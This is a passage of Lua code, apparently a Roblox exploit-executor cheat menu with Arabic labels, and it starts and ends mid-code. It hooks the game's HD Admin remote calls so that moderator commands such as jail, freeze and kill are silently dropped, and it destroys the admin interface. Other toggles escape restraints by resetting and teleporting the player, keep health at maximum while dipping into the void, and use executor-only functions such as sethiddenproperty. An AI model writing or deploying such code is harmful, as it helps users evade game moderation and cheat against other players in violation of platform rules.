                                warn("[CuffProtect2] Weld في جزء: " .. bodyPart.Name)
                                pcall(function() partConn:Disconnect() end)
                                pcall(function() monitor:Disconnect() end)
                                local curHum = char:FindFirstChildOfClass("Humanoid")
                                if curHum and curHum.Health > 0 then doReset(curHum) end
                            end
                        end)
                    end
                end)
                table.insert(_cuff2Conns, partConn)
            end
        end

        do

            local _fb_lastSafeCF      = root.CFrame
            local _fb_lastPos         = root.Position
            local _fb_lastWalkSpeed   = hum.WalkSpeed
            local _fb_lastJumpPower   = hum.JumpPower
            local _fb_lastState       = hum:GetState()
            local _fb_cooldownUntil   = 0
            local _fb_COOLDOWN        = 6
            local _fb_frozenTick      = nil
            local _fb_FREEZE_CONFIRM  = 1.2
            local _fb_resetDone       = false

            local _fb_score           = 0

            local function _fb_doReset(reason)

                if _resetInProgress  then return end
                if _fb_resetDone     then return end
                if tick() < _fb_cooldownUntil then return end

                if not _cuff2Active then return end

                _fb_resetDone     = true
                _resetInProgress  = true
                _fb_cooldownUntil = tick() + _fb_COOLDOWN

                local savedCF = _savedCFrame

                warn("[CuffProtect2-Fallback] تفعّل بسبب: " .. tostring(reason))
                showNotification(" [Fallback] تجميد مكتشف: " .. reason)

                pcall(function() hum.Health = 0 end)

                task.spawn(function()
                    local newChar = LocalPlayer.CharacterAdded:Wait()
                    local newRoot = newChar:WaitForChild("HumanoidRootPart", 8)
                    local newHum  = newChar:WaitForChild("Humanoid", 8)

                    if newRoot and newHum and savedCF then
                        local t = tick()
                        repeat task.wait(0.05) until newHum.Health > 0 or tick()-t > 6
                        task.wait(0.2)
                        pcall(function() newRoot.CFrame = savedCF end)
                        showNotification(" [Fallback] رجعت للموقع الآمن!")
                        warn("[CuffProtect2-Fallback] تم الارجاع للموقع: " .. tostring(savedCF))
                    end

                    task.wait(1.5)
                    _resetInProgress = false
                    _fb_resetDone    = false
                    _fb_score        = 0
                    _fb_frozenTick   = nil
                end)
            end

            local NORMAL_STATES = {
                [Enum.HumanoidStateType.Running]       = true,
                [Enum.HumanoidStateType.Landed]        = true,
                [Enum.HumanoidStateType.Jumping]       = true,
                [Enum.HumanoidStateType.Freefall]      = true,
                [Enum.HumanoidStateType.Climbing]      = true,
                [Enum.HumanoidStateType.Swimming]      = true,
                [Enum.HumanoidStateType.RunningNoPhysics] = true,
            }

            local SUSPECT_STATES = {
                [Enum.HumanoidStateType.PlatformStanding] = true,
                [Enum.HumanoidStateType.Seated]           = true,
                [Enum.HumanoidStateType.Physics]          = true,
                [Enum.HumanoidStateType.StrafingNoPhysics]= true,
            }

            local _fb_lastTick = 0
            local _fb_monitor
            _fb_monitor = RunService.Heartbeat:Connect(function(dt)
                local now = tick()
                if now - _fb_lastTick < 0.3 then return end
                _fb_lastTick = now

                if not _cuff2Active
                or not char.Parent
                or hum.Health <= 0
                or _resetInProgress
                or _fb_resetDone then
                    pcall(function() _fb_monitor:Disconnect() end)
                    return
                end

                pcall(function()
                    local curRoot = char:FindFirstChild("HumanoidRootPart")
                    local curHum  = char:FindFirstChildOfClass("Humanoid")
                    if not curRoot or not curHum or curHum.Health <= 0 then
                        pcall(function() _fb_monitor:Disconnect() end)
                        return
                    end

                    local curState = curHum:GetState()
                    local curPos   = curRoot.Position
                    local posDiff  = (curPos - _fb_lastPos).Magnitude

                    if NORMAL_STATES[curState] and not isCuffed(char) then
                        _savedCFrame    = curRoot.CFrame
                        _fb_lastSafeCF  = curRoot.CFrame
                        _fb_score       = 0
                        _fb_frozenTick  = nil
                    end

                    local reasonParts = {}
                    local score = 0

                    if curHum.PlatformStand == true then
                        score += 3
                        table.insert(reasonParts, "PlatformStand=true")
                    end

                    if SUSPECT_STATES[curState] then
                        score += 2
                        table.insert(reasonParts, "State="..tostring(curState))
                    end

                    if curHum.WalkSpeed == 0 and _fb_lastWalkSpeed > 0 then
                        score += 2
                        table.insert(reasonParts, "WalkSpeed→0")
                    end

                    if curHum.JumpPower == 0 and _fb_lastJumpPower > 0 then
                        score += 1
                        table.insert(reasonParts, "JumpPower→0")
                    end

                    if not isTouchDevice then
                        local tryMove = UserInputService:IsKeyDown(Enum.KeyCode.W)
                                     or UserInputService:IsKeyDown(Enum.KeyCode.A)
                                     or UserInputService:IsKeyDown(Enum.KeyCode.S)
                                     or UserInputService:IsKeyDown(Enum.KeyCode.D)
                        if tryMove and posDiff < 0.03 and curHum.WalkSpeed > 0 then
                            score += 2
                            table.insert(reasonParts, "FrozenWhileMoving")
                        end
                    end

                    if curRoot.Parent ~= char then
                        score += 4
                        table.insert(reasonParts, "RootReparented")
                    end

                    for _, obj in ipairs(curRoot:GetChildren()) do
                        if obj:IsA("AlignPosition")
                        or obj:IsA("AlignOrientation")
                        or obj:IsA("VectorForce")
                        or obj:IsA("BodyPosition")
                        or obj:IsA("BodyGyro") then
                            score += 2
                            table.insert(reasonParts, "Constraint:"..obj.ClassName)
                            break
                        end
                    end

                    local vel = curRoot.AssemblyLinearVelocity
                    if vel.Magnitude < 0.1 and posDiff < 0.03 and curHum.WalkSpeed > 0 then
                        score += 1
                        table.insert(reasonParts, "ZeroVelocity")
                    end

                    local anchorCheck = {"UpperTorso","LowerTorso","HumanoidRootPart","Torso"}
                    for _, pn in ipairs(anchorCheck) do
                        local p = char:FindFirstChild(pn)
                        if p and p:IsA("BasePart") and p.Anchored then
                            score += 5
                            table.insert(reasonParts, "Anchored:"..pn)
                            break
                        end
                    end

                    _fb_lastPos       = curPos
                    _fb_lastWalkSpeed = curHum.WalkSpeed
                    _fb_lastJumpPower = curHum.JumpPower
                    _fb_lastState     = curState

                    if score >= 4 then
                        if _fb_frozenTick == nil then
                            _fb_frozenTick = tick()
                        elseif tick() - _fb_frozenTick >= _fb_FREEZE_CONFIRM then

                            local reason = table.concat(reasonParts, " + ")
                            pcall(function() _fb_monitor:Disconnect() end)
                            _fb_doReset(reason)
                        end
                    else

                        _fb_frozenTick = nil
                        _fb_score      = 0
                    end
                end)
            end)

            table.insert(_cuff2Conns, _fb_monitor)

            local _fb_propConn
            _fb_propConn = hum:GetPropertyChangedSignal("PlatformStand"):Connect(function()
                if not _cuff2Active or _resetInProgress or _fb_resetDone then return end
                if hum.PlatformStand == true then
                    warn("[CuffProtect2-Fallback] PropertyChanged: PlatformStand → true")
                    pcall(function() _fb_propConn:Disconnect() end)
                    _fb_doReset("PlatformStand_PropertyChanged")
                end
            end)
            table.insert(_cuff2Conns, _fb_propConn)

            local _fb_wsConn
            _fb_wsConn = hum:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
                if not _cuff2Active or _resetInProgress or _fb_resetDone then return end

                if hum.WalkSpeed == 0 then
                    task.delay(0.3, function()

                        if not _cuff2Active or _resetInProgress or _fb_resetDone then return end
                        if hum.WalkSpeed == 0 and
                           (hum.PlatformStand or SUSPECT_STATES[hum:GetState()]) then
                            warn("[CuffProtect2-Fallback] WalkSpeed→0 مع حالة مشبوهة")
                            pcall(function() _fb_wsConn:Disconnect() end)
                            _fb_doReset("WalkSpeed=0+SuspectState")
                        end
                    end)
                end
            end)
            table.insert(_cuff2Conns, _fb_wsConn)

        end
    end

    _cuff2Btn.MouseButton1Click:Connect(function()
        _cuff2Active = not _cuff2Active

        if _cuff2Active then
            _cuff2Btn.Text             = " ايقاف كلبشه2"
            _cuff2Btn.BackgroundColor3 = Theme.Active
            showNotification(" حماية كلبشه2 مفعلة")

            watchChar(LocalPlayer.Character)

            table.insert(_cuff2Conns, LocalPlayer.CharacterAdded:Connect(function(newChar)
                if _cuff2Active then
                    task.wait(0.1)
                    _resetInProgress = false
                    watchChar(newChar)
                end
            end))

        else
            _cuff2Btn.Text             = "حماية كلبشه2"
            _cuff2Btn.BackgroundColor3 = Theme.ButtonBlue

            for _, c in ipairs(_cuff2Conns) do
                pcall(function() c:Disconnect() end)
            end
            _cuff2Conns      = {}
            _resetInProgress = false

            showNotification(" تم ايقاف حماية كلبشه2")
        end
    end)
end

do
    local _nvActive = false
    local _nvMonitorLoop = nil
    local _nvBtn = makeButton("AntiNVBtn", "مضاد NV", UDim2.new(0.5, -14, 0, 34), UDim2.new(0.5, 4, 0, 54), Theme.ButtonBlue, Theme.Accent)

    _nvBtn.Parent = MudadatPage

    local _nvBlockedCommands = {
        "ice", "jail", "logs", "clogs", "cmdbar", "nv", "nightvision",
        "warp", "title", "blur", "alerts", "bing", "dog", "fling",
        "explode", "re", "res", "loopwarp", "sit", "lay", "seated",
        "freeze", "stun", "ragdoll", "kill", "damage", "godmode",
        "fly", "speed", "noclip", "invisible", "size", "scale"
    }

    local function _nvBlockCommand(command)
        if not _nvActive then return false end
        if type(command) ~= "string" then return false end
        local cmdLower = string.lower(command)
        for _, blocked in ipairs(_nvBlockedCommands) do
            if string.find(cmdLower, blocked) then return true end
        end
        return false
    end

    local function _nvSetupProtection()

        pcall(function()
            local dsFolder = ReplicatedStorage:FindFirstChild("RemoteEvents")
            if dsFolder and dsFolder:FindFirstChild("DataService") then
                local ds = dsFolder.DataService
                local oldFire = ds.FireServer
                ds.FireServer = function(self, cmd)
                    if _nvBlockCommand(cmd) then return end
                    return oldFire(self, cmd)
                end
            end
        end)

        pcall(function()
            local hd = ReplicatedStorage:FindFirstChild("HDAdminHDClient")
            if hd and hd.Signals and hd.Signals.RequestCommandModification then
                local rcm = hd.Signals.RequestCommandModification
                local oldInvoke = rcm.InvokeServer
                rcm.InvokeServer = function(self, cmd)
                    if _nvBlockCommand(cmd) then return end
                    return oldInvoke(self, cmd)
                end
            end
        end)

        pcall(function()
            local gui = LocalPlayer.PlayerGui
            if gui:FindFirstChild("HDAdminInterface") then gui.HDAdminInterface:Destroy() end
            if gui:FindFirstChild("HDAdminGui") then gui.HDAdminGui:Destroy() end
            if ReplicatedStorage:FindFirstChild("HDAdminHDClient")
            and ReplicatedStorage.HDAdminHDClient:FindFirstChild("Assets")
            and ReplicatedStorage.HDAdminHDClient.Assets:FindFirstChild("NightVision") then
                ReplicatedStorage.HDAdminHDClient.Assets.NightVision:Destroy()
            end
        end)

        pcall(function()
            local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
            local hum = char:WaitForChild("Humanoid")
            hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
            hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
            hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
        end)
    end

    _nvBtn.MouseButton1Click:Connect(function()
        _nvActive = not _nvActive

        if _nvActive then
            _nvBtn.Text = " ايقاف مضاد NV"
            _nvBtn.BackgroundColor3 = Theme.Active

            _nvSetupProtection()
            showNotification(" مضاد NV مفعل — جميع الاوامر محمية")

            _nvMonitorLoop = task.spawn(function()
                while _nvActive do
                    task.wait(0.8)
                    _nvSetupProtection()
                end
            end)
        else
            _nvActive = false
            _nvBtn.Text = "مضاد NV"
            _nvBtn.BackgroundColor3 = Theme.ButtonBlue
            showNotification(" تم ايقاف مضاد NV")
        end
    end)
end

do local b = makeButton("AntiLagBtn", "مضاد لاج", UDim2.new(0.5, -14, 0, 34), UDim2.new(0, 10, 0, 174), Theme.ButtonBlue, Theme.Accent); b.Parent = MudadatPage end

do
    local AB2_ON       = false
    local AB2_SESSION  = 0
    local AB2_SAVED_CF = nil
    local AB2_TWEEN_TIME = 0.1
    local AB2_VOID_POS   = Vector3.new(0, -80000000, 0)
    local AB2_velConn    = nil

    local ab2Btn = makeButton(
        "AntiBang2Btn",
        T18T("مضاد بانق2"),
        UDim2.new(0.5, -14, 0, 34),
        UDim2.new(0.5, 4, 0, 174),
        Theme.ButtonBlue,
        Theme.Accent
    )
    ab2Btn.Parent = MudadatPage

    local function _ab2FixCamera(subject)
        pcall(function()
            if workspace.CurrentCamera then
                workspace.CurrentCamera.CameraSubject = subject
            end
        end)
    end

    local function _ab2ClearGaze()
        pcall(function()
            for _, obj in ipairs(workspace:GetChildren()) do
                if obj:IsA("BasePart") and obj.Name == "AB2Gaze" then
                    obj:Destroy()
                end
            end
        end)
    end

    local function _ab2StopVel()
        if AB2_velConn then
            AB2_velConn:Disconnect()
            AB2_velConn = nil
        end
    end

    ab2Btn.MouseButton1Click:Connect(function()
        AB2_ON = not AB2_ON

        if AB2_ON then
            ab2Btn.Text             = T18T("ايقاف مضاد بانق2")
            ab2Btn.BackgroundColor3 = Theme.Active
            showNotification(T18T(" مضاد بانق2 مفعّل"))

            AB2_SESSION += 1
            local mySession = AB2_SESSION

            task.spawn(function()
                while AB2_ON and AB2_SESSION == mySession do
                    local char = LocalPlayer.Character
                    local root = char and char:FindFirstChild("HumanoidRootPart")
                    local hum  = char and char:FindFirstChildOfClass("Humanoid")

                    if root and root.Parent and hum then

                        AB2_SAVED_CF = root.CFrame
                        hum.BreakJointsOnDeath = false
                        hum.RequiresNeck       = false
                        hum.Health             = hum.MaxHealth

                        _ab2ClearGaze()
                        local gazePart = Instance.new("Part")
                        gazePart.Name        = "AB2Gaze"
                        gazePart.Size        = Vector3.new(4, 5, 4)
                        gazePart.CFrame      = AB2_SAVED_CF
                        gazePart.Anchored    = true
                        gazePart.CanCollide  = false
                        gazePart.Transparency = 1
                        gazePart.Parent      = workspace
                        _ab2FixCamera(gazePart)

                        local origFPDH = workspace.FallenPartsDestroyHeight
                        workspace.FallenPartsDestroyHeight = 0/0

                        local tweenInfo = TweenInfo.new(
                            AB2_TWEEN_TIME,
                            Enum.EasingStyle.Linear,
                            Enum.EasingDirection.Out
                        )
                        local tweenGo = TweenService:Create(
                            root,
                            tweenInfo,
                            {CFrame = CFrame.new(AB2_VOID_POS)}
                        )
                        tweenGo:Play()
                        tweenGo.Completed:Wait()

                        AB2_velConn = RunService.Heartbeat:Connect(function()
                            if AB2_ON and root and root.Parent then
                                root.AssemblyLinearVelocity = Vector3.zero
                                local h = char:FindFirstChildOfClass("Humanoid")
                                if h then
                                    h.Health             = h.MaxHealth
                                    h.BreakJointsOnDeath = false
                                    h.RequiresNeck       = false
                                end
                            end
                        end)
                        task.wait(0.3)
                        _ab2StopVel()

                        if AB2_ON and AB2_SESSION == mySession and root.Parent then
                            local tweenBack = TweenService:Create(
                                root,
                                tweenInfo,
                                {CFrame = AB2_SAVED_CF}
                            )
                            tweenBack:Play()
                            tweenBack.Completed:Wait()
                        end

                        _ab2ClearGaze()
                        pcall(function()
                            local h = char:FindFirstChildOfClass("Humanoid")
                            if h and workspace.CurrentCamera then
                                workspace.CurrentCamera.CameraSubject = h
                            end
                        end)

                        workspace.FallenPartsDestroyHeight = origFPDH

                        local waited = 0
                        while waited < 2.5 and AB2_ON and AB2_SESSION == mySession do
                            task.wait(0.05)
                            waited += 0.05
                        end
                    else
                        task.wait(0.2)
                    end
                end
            end)

        else
            AB2_ON = false
            ab2Btn.Text             = T18T("مضاد بانق2")
            ab2Btn.BackgroundColor3 = Theme.ButtonBlue
            _ab2StopVel()
            _ab2ClearGaze()
            local char = LocalPlayer.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            local hum  = char and char:FindFirstChildOfClass("Humanoid")
            if root and AB2_SAVED_CF then
                root.CFrame = AB2_SAVED_CF
            end
            if hum and workspace.CurrentCamera then
                pcall(function() workspace.CurrentCamera.CameraSubject = hum end)
            end
            AB2_SAVED_CF = nil
            showNotification(T18T(" مضاد بانق2 ايقاف"))
        end
    end)
end

local _PauseNotificationControl = {
    hidden = false,
    antiVoid = false,
}

local function _applyPauseNotificationSetting()
    pcall(function()
        game:GetService("GuiService"):SetGameplayPausedNotificationEnabled(
            not (_PauseNotificationControl.hidden or _PauseNotificationControl.antiVoid)
        )
    end)
end

do
    local pauseBtn = makeButton(
        "PauseNoticeBtn",
        T18T("اخفاء علامة Pause"),
        UDim2.new(0.5, -14, 0, 34),
        UDim2.new(0.5, 4, 0, 214),
        Theme.ButtonBlue,
        Theme.Accent
    )
    pauseBtn.Parent = MudadatPage

    local pauseScanConn
    local pauseAddedConn

    local function hidePauseNode(node)
        local name = node.Name:lower()
        local isPauseNotice = name:find("gameplaypaused", 1, true)
            or name:find("pausenotification", 1, true)
        if not isPauseNotice then return end

        pcall(function()
            if node:IsA("GuiObject") then
                node.Visible = false
            elseif node:IsA("ScreenGui") then
                node.Enabled = false
            end
        end)
    end

    local function hidePauseNotice()
        _applyPauseNotificationSetting()
        pcall(function()
            local coreGui = game:GetService("CoreGui")
            local robloxGui = coreGui:FindFirstChild("RobloxGui")
            if robloxGui then
                for _, node in ipairs(robloxGui:GetDescendants()) do
                    hidePauseNode(node)
                end
            end
        end)
    end

    pauseBtn.MouseButton1Click:Connect(function()
        _PauseNotificationControl.hidden = not _PauseNotificationControl.hidden

        if _PauseNotificationControl.hidden then
            pauseBtn.Text = T18T("ايقاف اخفاء Pause")
            pauseBtn.BackgroundColor3 = Theme.Active
            hidePauseNotice()

            pcall(function()
                local coreGui = game:GetService("CoreGui")
                pauseAddedConn = coreGui.DescendantAdded:Connect(function(node)
                    if _PauseNotificationControl.hidden then
                        hidePauseNode(node)
                    end
                end)
            end)

            local lastScan = 0
            pauseScanConn = RunService.Heartbeat:Connect(function()
                if not _PauseNotificationControl.hidden then return end
                local now = os.clock()
                if now - lastScan < 0.25 then return end
                lastScan = now
                hidePauseNotice()
            end)
        else
            if pauseScanConn then
                pauseScanConn:Disconnect()
                pauseScanConn = nil
            end
            if pauseAddedConn then
                pauseAddedConn:Disconnect()
                pauseAddedConn = nil
            end

            pauseBtn.Text = T18T("اخفاء علامة Pause")
            pauseBtn.BackgroundColor3 = Theme.ButtonBlue
            _applyPauseNotificationSetting()
        end
    end)
end

local AntiVoidBtn = makeButton(
    "AntiVoidBtn",
    T18T("مضاد فويد"),
    UDim2.new(0.5, -14, 0, 34),
    UDim2.new(0.5, 4, 0, 134),
    Theme.ButtonBlue,
    Theme.Accent
)
AntiVoidBtn.Parent = MudadatPage
-- ════════════════════════════════════════════════════════════
--  مضاد لاق (للصمله) : وضع البطاطا الخارق
--  يسطّح كل الخامات، يطفي الإضاءة والمؤثرات، ويحذف القطع اللي ما لها فايده
--  الأرضية ما تنحذف ابد (اي قطعة CanCollide = true محمية)
-- ════════════════════════════════════════════════════════════
do
    local PotatoBtn = makeButton(
        "PotatoLagBtn",
        T18T("مضاد لاق (للصمله)"),
        UDim2.new(0.5, -14, 0, 34),
        UDim2.new(0, 10, 0, 214),
        Theme.ButtonBlue,
        Theme.Accent
    )
    PotatoBtn.Parent = MudadatPage

    local Lighting_P = game:GetService("Lighting")
    local P = {
        on = false,
        session = 0,
        conns = {},
        lightSaved = nil,
        terrainSaved = nil,
        qualitySaved = nil,
        stash = {},
        removed = 0,
    }
    local savedParts  = setmetatable({}, { __mode = "k" })
    local savedDecals = setmetatable({}, { __mode = "k" })
    local disabledFx  = setmetatable({}, { __mode = "k" })

    local function setState(on)
        if on then
            PotatoBtn.BackgroundColor3 = Theme.Active
            PotatoBtn.Text = T18T("ايقاف وضع الصمله")
        else
            PotatoBtn.BackgroundColor3 = Theme.ButtonDefault
            PotatoBtn.Text = T18T("مضاد لاق (للصمله)")
        end
    end

    -- يحط القيمة حتى لو الخاصية مخفية
    local function hp(obj, prop, val)
        local ok = pcall(function() obj[prop] = val end)
        if not ok and sethiddenproperty then
            pcall(sethiddenproperty, obj, prop, val)
        end
    end

    local function charOf(obj)
        local m = obj:FindFirstAncestorOfClass("Model")
        while m do
            if m:FindFirstChildOfClass("Humanoid") then return m end
            m = m:FindFirstAncestorOfClass("Model")
        end
        return nil
    end

    local function isImportant(part)
        if part:IsA("Seat") or part:IsA("VehicleSeat") or part:IsA("SpawnLocation") then return true end
        if part:FindFirstChild("TouchInterest") or part:FindFirstChildWhichIsA("ClickDetector") then return true end
        if part:FindFirstChildWhichIsA("ProximityPrompt", true) then return true end
        if part:FindFirstChildWhichIsA("LuaSourceContainer", true) then return true end
        if part:FindFirstChildWhichIsA("SurfaceGui") or part:FindFirstChildWhichIsA("BillboardGui") then return true end
        return false
    end

    -- القطعة "ما لها فايده" اذا: ثابتة + ما تصطدم + (مخفية او صغيرة مره) + ما عليها شي مهم
    local function isUseless(part)
        if part.CanCollide or not part.Anchored then return false end
        if isImportant(part) then return false end
        if part.Transparency >= 0.98 then return true end
        local s = part.Size
        if math.max(s.X, s.Y, s.Z) < 1.2 then return true end
        return false
    end

    local function processObj(v, allowDelete)
        local myChar = LocalPlayer.Character
        if v:IsA("BasePart") then
            if v:IsA("Terrain") then return end
            local ch = charOf(v)
            if allowDelete and not ch and isUseless(v) then
                pcall(function() v:Destroy() end)
                P.removed = P.removed + 1
                return
            end
            if not savedParts[v] then
                savedParts[v] = { v.Material, v.Reflectance, v.CastShadow }
            end
            v.Material = Enum.Material.SmoothPlastic
            v.Reflectance = 0
            v.CastShadow = false
            if v:IsA("MeshPart") then
                hp(v, "RenderFidelity", Enum.RenderFidelity.Performance)
                if ch ~= myChar then pcall(function() v.TextureID = "" end) end
            end
        elseif v:IsA("Decal") or v:IsA("Texture") then
            local ch = charOf(v)
            if ch and ch == myChar then return end -- نخلي وجهك
            if savedDecals[v] == nil then savedDecals[v] = v.Transparency end
            v.Transparency = 1
        elseif v:IsA("SurfaceAppearance") then
            pcall(function() v:Destroy() end)
        elseif v:IsA("SpecialMesh") then
            local ch = charOf(v)
            if ch ~= myChar then pcall(function() v.TextureId = "" end) end
        elseif v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Beam")
            or v:IsA("Smoke") or v:IsA("Fire") or v:IsA("Sparkles") then
            if v.Enabled then
                disabledFx[v] = true
                v.Enabled = false
            end
        elseif v:IsA("Explosion") then
            pcall(function() v.Visible = false end)
        elseif v:IsA("Accessory") or v:IsA("Shirt") or v:IsA("Pants") or v:IsA("ShirtGraphic") then
            -- اكسسوارات وملابس اللاعبين الثانيين (عندك انت بس)
            local ch = charOf(v)
            if ch and ch ~= myChar and Players:GetPlayerFromCharacter(ch) then
                pcall(function() v:Destroy() end)
            end
        end
    end

    local function isLightFx(e)
        return e:IsA("PostEffect") or e:IsA("Atmosphere") or e:IsA("Sky")
    end

    local function stashFx(e)
        if not P.on or not e or not e.Parent then return end
        table.insert(P.stash, e)
        pcall(function() e.Parent = nil end)
    end

    local function applyLighting()
        local L = Lighting_P
        if not P.lightSaved then
            P.lightSaved = {
                GlobalShadows = L.GlobalShadows,
                FogEnd = L.FogEnd,
                FogStart = L.FogStart,
                Brightness = L.Brightness,
                ShadowSoftness = L.ShadowSoftness,
                EnvironmentDiffuseScale = L.EnvironmentDiffuseScale,
                EnvironmentSpecularScale = L.EnvironmentSpecularScale,
            }
        end
        pcall(function()
            L.GlobalShadows = false
            L.FogStart = 9e9
            L.FogEnd = 9e9
            L.Brightness = 1
            L.ShadowSoftness = 0
            L.EnvironmentDiffuseScale = 0
            L.EnvironmentSpecularScale = 0
        end)
        hp(L, "Technology", Enum.Technology.Compatibility)
    end

    local function applyTerrain()
        local t = workspace:FindFirstChildOfClass("Terrain")
        if not t then return end
        if not P.terrainSaved then
            P.terrainSaved = {
                WaterWaveSize = t.WaterWaveSize,
                WaterWaveSpeed = t.WaterWaveSpeed,
                WaterReflectance = t.WaterReflectance,
                WaterTransparency = t.WaterTransparency,
            }
        end
        pcall(function()
            t.WaterWaveSize = 0
            t.WaterWaveSpeed = 0
            t.WaterReflectance = 0
            t.WaterTransparency = 0
        end)
        hp(t, "Decoration", false) -- يشيل العشب
        local c = t:FindFirstChildOfClass("Clouds")
        if c then pcall(function() c.Enabled = false end) end
    end

    local function applyQuality()
        if not P.qualitySaved then
            P.qualitySaved = {}
            pcall(function()
                P.qualitySaved.saved = UserSettings():GetService("UserGameSettings").SavedQualityLevel
            end)
        end
        pcall(function() settings().Rendering.QualityLevel = Enum.QualityLevel.Level01 end)
        pcall(function()
            UserSettings():GetService("UserGameSettings").SavedQualityLevel = Enum.SavedQualitySetting.QualityLevel1
        end)
        pcall(function() if setfpscap then setfpscap(999) end end)
    end

    local function measureFPS(sec)
        local frames, t = 0, 0
        local conn
        conn = RunService.RenderStepped:Connect(function(dt)
            frames = frames + 1
            t = t + dt
        end)
        task.wait(sec)
        conn:Disconnect()
        if t <= 0 then return 0 end
        return math.floor(frames / t + 0.5)
    end

    local function scanAll(mySession)
        local list = workspace:GetDescendants()
        for i = 1, #list do
            if P.session ~= mySession or not P.on then return false end
            local v = list[i]
            if v.Parent then pcall(processObj, v, true) end
            if i % 350 == 0 then task.wait() end -- عشان الجهاز الضعيف ما يفريز وقت التفعيل
        end
        return true
    end

    local function enable()
        P.on = true
        P.session = P.session + 1
        P.removed = 0
        local mySession = P.session
        setState(true)
        T18ShowToast(T18T("جاري تفعيل وضع الصمله..."))

        task.spawn(function()
            local before = measureFPS(1)
            if P.session ~= mySession then return end

            applyQuality()
            applyLighting()
            applyTerrain()
            for _, e in ipairs(Lighting_P:GetChildren()) do
                if isLightFx(e) then stashFx(e) end
            end

            table.insert(P.conns, Lighting_P.ChildAdded:Connect(function(e)
                if P.on and isLightFx(e) then task.defer(stashFx, e) end
            end))
            -- الاشياء الجديدة تتسطح بس (ما نحذفها عشان ما نخرب شي في اللعبة)
            table.insert(P.conns, workspace.DescendantAdded:Connect(function(v)
                if not P.on then return end
                task.defer(function()
                    if P.on and v.Parent then pcall(processObj, v, false) end
                end)
            end))

            -- بعض الماب ترجع الاضاءة (ليل/نهار)، فنثبتها كل ثانيتين
            task.spawn(function()
                while P.on and P.session == mySession do
                    applyLighting()
                    task.wait(2)
                end
            end)

            if not scanAll(mySession) then return end
            task.wait(1)
            if P.session ~= mySession then return end
            local after = measureFPS(1)
            T18ShowToast(("FPS: %d -> %d | حذفت %d قطعة"):format(before, after, P.removed))
        end)
    end

    local function disable()
        P.on = false
        P.session = P.session + 1
        local mySession = P.session
        setState(false)
        for _, c in ipairs(P.conns) do pcall(function() c:Disconnect() end) end
        table.clear(P.conns)

        pcall(function()
            if P.lightSaved then
                for k, val in pairs(P.lightSaved) do Lighting_P[k] = val end
            end
        end)
        hp(Lighting_P, "Technology", Enum.Technology.Future)
        for _, e in ipairs(P.stash) do pcall(function() e.Parent = Lighting_P end) end
        table.clear(P.stash)

        local t = workspace:FindFirstChildOfClass("Terrain")
        if t then
            pcall(function()
                if P.terrainSaved then
                    for k, val in pairs(P.terrainSaved) do t[k] = val end
                end
            end)
            hp(t, "Decoration", true)
            local c = t:FindFirstChildOfClass("Clouds")
            if c then pcall(function() c.Enabled = true end) end
        end

        pcall(function() settings().Rendering.QualityLevel = Enum.QualityLevel.Automatic end)
        pcall(function()
            if P.qualitySaved and P.qualitySaved.saved then
                UserSettings():GetService("UserGameSettings").SavedQualityLevel = P.qualitySaved.saved
            end
        end)
        P.lightSaved, P.terrainSaved, P.qualitySaved = nil, nil, nil

        task.spawn(function()
            local n = 0
            for part, d in pairs(savedParts) do
                if P.session ~= mySession then return end
                pcall(function()
                    if part.Parent then
                        part.Material = d[1]
                        part.Reflectance = d[2]
                        part.CastShadow = d[3]
                    end
                end)
                n = n + 1
                if n % 400 == 0 then task.wait() end
            end
            for dec, tr in pairs(savedDecals) do
                if P.session ~= mySession then return end
                pcall(function() if dec.Parent then dec.Transparency = tr end end)
                n = n + 1
                if n % 400 == 0 then task.wait() end
            end
            for fx in pairs(disabledFx) do
                if P.session ~= mySession then return end
                pcall(function() if fx.Parent then fx.Enabled = true end end)
            end
            table.clear(savedParts)
            table.clear(savedDecals)
            table.clear(disabledFx)
        end)

        T18ShowToast(T18T("تم ايقاف وضع الصمله (المحذوف يرجع بالرجوين)"))
    end

    PotatoBtn.MouseButton1Click:Connect(function()
        if P.on then disable() else enable() end
    end)
end

do
    local MudadatScroll = Instance.new("ScrollingFrame")
    MudadatScroll.Size = UDim2.new(1, 0, 1, 0)
    MudadatScroll.BackgroundTransparency = 1
    MudadatScroll.BorderSizePixel = 0
    MudadatScroll.ScrollBarThickness = isTouchDevice and 3 or 4
    MudadatScroll.ScrollBarImageColor3 = Theme.Active
    MudadatScroll.CanvasSize = UDim2.new(0, 0, 0, 345)
    MudadatScroll.ScrollingDirection = Enum.ScrollingDirection.Y
    MudadatScroll.ElasticBehavior = Enum.ElasticBehavior.Always
    MudadatScroll.Parent = MudadatPage
    for _, child in ipairs(MudadatPage:GetChildren()) do
        if child ~= MudadatScroll then
            child.Parent = MudadatScroll
        end
    end
end

do local b = makeButton("NoClipBtn", "اختراق جدران", UDim2.new(0.5, -14, 0, 38), UDim2.new(0, 10, 0, 258), Theme.ButtonBlue, Theme.Accent); b.Parent = PlayerPage end

do
    local skinBtn = makeButton(
        "SkinSpamBtn",
        T18T("سبام سكنات"),
        UDim2.new(0.5, -14, 0, 38),
        UDim2.new(0, 10, 0, 302),
        Theme.ButtonBlue,
        Theme.Accent
    )
    skinBtn.Parent = PlayerPage
end

do
    local fcBtn = makeButton("FreeCamBtn", T18T("فري كام"), UDim2.new(0.5, -14, 0, 38), UDim2.new(0.5, 4, 0, 170), Theme.ButtonBlue, Theme.Accent)
    fcBtn.Parent = PlayerPage

    local active = false
    local conns = {}
    local saved = nil
    local ctrlGui = nil
    local camPos = Vector3.zero
    local yaw, pitch = 0, 0
    local speed = 60
    local rmbDown, upHeld, downHeld = false, false, false

    local function disconnectAll()
        for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
        conns = {}
    end

    local function stop()
        if not active then return end
        active = false
        disconnectAll()
        rmbDown, upHeld, downHeld = false, false, false
        pcall(function() UserInputService.MouseBehavior = Enum.MouseBehavior.Default end)
        if ctrlGui then pcall(function() ctrlGui:Destroy() end) ctrlGui = nil end
        local cam = workspace.CurrentCamera
        if saved then
            pcall(function()
                saved.hum.WalkSpeed = saved.ws
                saved.hum.JumpPower = saved.jp
                saved.hum.JumpHeight = saved.jh
            end)
            if cam then
                pcall(function()
                    cam.CameraType = Enum.CameraType.Custom
